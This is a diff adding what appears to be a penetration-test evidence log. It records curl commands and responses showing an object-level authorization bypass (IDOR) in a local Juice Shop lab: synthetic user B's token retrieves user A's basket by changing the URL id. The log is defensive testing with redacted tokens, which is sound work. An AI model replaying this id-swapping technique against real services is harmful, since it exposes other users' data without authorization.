@@ -1,0 +1,39 @@
+Captured 2026-10-28 against http://127.0.0.1:3000 (isolated local lab, Juice Shop 20.3.0).
+Two synthetic accounts created for this test only. No real credentials or personal data used.
+
+Synthetic accounts:
+  User A: synth.a@lab.test (user id 25, basket id 6)
+  User B: synth.b@lab.test (user id 26, basket id 7)
+
+Step 1 - create account A
+> curl.exe -s -X POST http://127.0.0.1:3000/api/Users/ -H "Content-Type: application/json" -d "{\"email\":\"synth.a@lab.test\",\"password\":\"Lab-Test-123!\",...}"
+{"status":"success","data":{...,"id":25,"email":"synth.a@lab.test",...}}
+
+Step 2 - create account B
+> curl.exe -s -X POST http://127.0.0.1:3000/api/Users/ -H "Content-Type: application/json" -d "{\"email\":\"synth.b@lab.test\",\"password\":\"Lab-Test-123!\",...}"
+{"status":"success","data":{...,"id":26,"email":"synth.b@lab.test",...}}
+
+Step 3 - log in as A, note A's basket id (bid)
+> curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"synth.a@lab.test\",\"password\":\"Lab-Test-123!\"}"
+{"authentication":{"token":"<A's JWT, redacted>","bid":6,"umail":"synth.a@lab.test"}}
+
+Step 4 - log in as B, note B's own token and basket id
+> curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"synth.b@lab.test\",\"password\":\"Lab-Test-123!\"}"
+{"authentication":{"token":"<B's JWT, redacted>","bid":7,"umail":"synth.b@lab.test"}}
+
+Step 5 - using B's token, request A's basket (id 6) by changing the URL identifier
+> curl.exe -s -D - http://127.0.0.1:3000/rest/basket/6 -H "Authorization: Bearer <B's JWT>"
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+...
+Body: {"status":"success","data":{"id":6,"coupon":null,"UserId":25,"createdAt":"...","updatedAt":"...","Products":[]}}
+
+Observation: the server returned HTTP 200 and user A's basket object (UserId: 25)
+to a request authenticated as user B (id 26). The API does not verify that the
+basket id in the URL belongs to the authenticated caller. Expected secure
+behavior per test-case-matrix.md TC-002 was a 403/empty response; actual
+behavior is an object-level authorization bypass (IDOR).
+
+Note: both test baskets were empty (no products added), so no synthetic order
+data was exposed beyond the basket's existence/ownership. JWTs redacted from
+this file; full tokens are not persisted elsewhere.
